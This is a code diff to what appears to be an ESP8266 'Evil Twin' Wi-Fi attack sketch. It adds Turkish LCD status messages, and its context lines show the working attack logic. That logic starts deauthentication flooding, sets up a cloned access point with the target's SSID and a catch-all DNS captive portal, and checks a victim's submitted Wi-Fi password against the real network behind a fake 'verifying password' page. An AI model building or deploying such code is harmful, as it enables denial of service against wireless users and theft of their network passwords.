@@ -70,6 +70,8 @@ void setup() {
   lcd.backlight(); 
   lcd.setCursor(0, 0);
   lcd.print("Evil Twin");
+  lcd.setCursor(0, 1);
+  lcd.print("Wifi Dos");
   lcd.backlight();
   Serial.begin(115200);
   WiFi.mode(WIFI_AP_STA);
@@ -161,8 +163,18 @@ void handleIndex() {
   if (webServer.hasArg("deauth")) {
     if (webServer.arg("deauth") == "start") {
       deauthing_active = true;
+          lcd.clear();
+    lcd.setCursor(0, 0);
+    lcd.print("Wifi Dos");
+    lcd.setCursor(0, 1);
+    lcd.print("Basladi.");
     } else if (webServer.arg("deauth") == "stop") {
       deauthing_active = false;
+      lcd.clear();
+      lcd.setCursor(0,0);
+      lcd.print("Evil Twin");
+      lcd.setCursor(0,1);
+      lcd.print("Wifi Dos");
     }
   }
 
@@ -176,6 +188,11 @@ void handleIndex() {
       WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
       WiFi.softAP(_selectedNetwork.ssid.c_str());
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+      lcd.clear();
+      lcd.setCursor(0, 0);
+      lcd.print("Evil Twin Agi");
+      lcd.setCursor(0, 1);
+      lcd.print("Olusturuldu...");
 
     } else if (webServer.arg("hotspot") == "stop") {
       hotspot_active = false;
@@ -248,11 +265,6 @@ void handleIndex() {
       WiFi.disconnect();
       WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
       webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Şifre doğrulanıyor, lütfen bekleyin...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
-      lcd.clear();
-      lcd.setCursor(0, 0);
-      lcd.print("Evil Twin Agi");
-      lcd.setCursor(0, 1);
-      lcd.print("Olusturuldu...");
       if (webServer.arg("deauth") == "start") {
       deauthing_active = true;
       }
